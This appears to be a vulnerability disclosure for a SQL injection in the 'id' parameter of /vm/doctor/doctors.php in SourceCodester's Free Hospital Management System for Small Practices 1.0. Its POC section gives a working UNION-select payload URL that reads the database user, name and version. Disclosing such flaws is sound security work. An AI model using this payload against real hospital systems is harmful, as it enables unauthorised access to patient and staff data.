# SourceCodester Free Hospital Management System for Small Practices 1.0 has a SQL Injection vulnerability in /vm/doctor/doctors.php
## Software
- Software: Free Hospital Management System for Small Practices 1.0
- Software Link: https://www.sourcecodester.com/php/16720/free-hospital-management-system-small-practices.html
- Vulnerability Type: SQL Injection
- Attack Type: Remote
- Vendor of Product: Sourcecodester

## Description
SourceCodester Free Hospital Management System for Small Practices 1.0 has a SQL Injection vulnerability in /vm/doctor/doctors.php. Affected is an unknown function of the file `/vm/doctor/doctors.php?action=view&id=2`,The manipulation of the argument `id` leads to SQL inject.

## Vulnerability Code
- /vm/doctor/doctors.php

![Vulnerability-Code](https://github.com/Yesec/Free-Hospital-Management-System-for-Small-Practices/assets/19534204/9f6b88c2-490d-4426-afc4-99a5a2600f89)

## POC

```
http://localhost/vm/doctor/doctors.php?action=view&id=0' union select 1,current_user(),database(),4,version(),6,7--+
```
![Exploit](https://github.com/Yesec/Free-Hospital-Management-System-for-Small-Practices/assets/19534204/899c3b20-4f75-4f0a-af57-c1097ada5f7f)
